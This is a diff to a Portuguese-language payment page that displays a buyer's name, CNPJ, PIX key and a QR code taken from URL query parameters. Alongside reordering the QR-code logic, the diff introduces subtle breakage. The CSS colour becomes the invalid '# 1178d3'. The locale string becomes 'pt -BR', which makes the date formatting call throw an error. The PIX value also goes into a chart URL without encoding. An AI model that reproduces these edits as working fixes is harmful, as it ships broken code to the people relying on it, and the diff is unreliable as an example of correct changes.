@@ -61,7 +61,7 @@
 
         .value-date p {
             font-size: 16px;
-            color: #1178d3; /* Corrigido: removido espaço */
+            color: # 1178d3; /* Corrigido: removido espaço */
             font-weight: 800;
             margin: 2px 0px 0px 0px;
         }
@@ -149,7 +149,7 @@
             <h2>Dados do Comprador:</h2>
             <label>Nome</label>
             <p id="nome"></p>
-            <label>CNPJ</label> <!-- Substituído "cpf" por "cnpj" -->
+            <label>CNPJ</label>
             <p id="cnpj"></p>
             <label>Chave PIX</label>
             <p id="pix">
@@ -187,7 +187,7 @@
                 hour12: false,
                 timeZone: 'America/Sao_Paulo'
             };
-            var dateTimeString = now.toLocaleString('pt-BR', options).replace(',', ''); // Remove a vírgula
+            var dateTimeString = now.toLocaleString('pt -BR', options).replace(',', ''); // Remove a vírgula
             var [date, time] = dateTimeString.split(' ');
             document.querySelector('.value-date span:first-child').textContent = date.trim(); // Remove espaços em branco extras
             document.querySelector('.value-date span:last-child').textContent = time;
@@ -199,16 +199,18 @@
             if (queryParams.nome) {
                 document.getElementById('nome').textContent = queryParams.nome;
             }
-            if (queryParams.cnpj) { // Substituído "cpf" por "cnpj"
+            if (queryParams.cnpj) {
                 document.getElementById('cnpj').textContent = queryParams.cnpj;
             }
             if (queryParams.pix) {
                 document.getElementById('pix').textContent = queryParams.pix;
-                // Atualizar o QR Code com o valor da chave PIX
-                document.getElementById('qrcode').src = `https://chart.googleapis.com/chart?chs=200x200&cht=qr&chl=${queryParams.pix}`;
             }
             if (queryParams.qrcode) {
+                // Use a imagem diretamente se qrcode estiver definido
                 document.getElementById('qrcode').src = queryParams.qrcode;
+            } else if (queryParams.pix) {
+                // Use a API do Google Charts para gerar o QR Code
+                document.getElementById('qrcode').src = `https://chart.googleapis.com/chart?chs=200x200&cht=qr&chl=${queryParams.pix}`;
             }
             // Atualiza a data e a hora ao carregar a página
             updateDateTime();
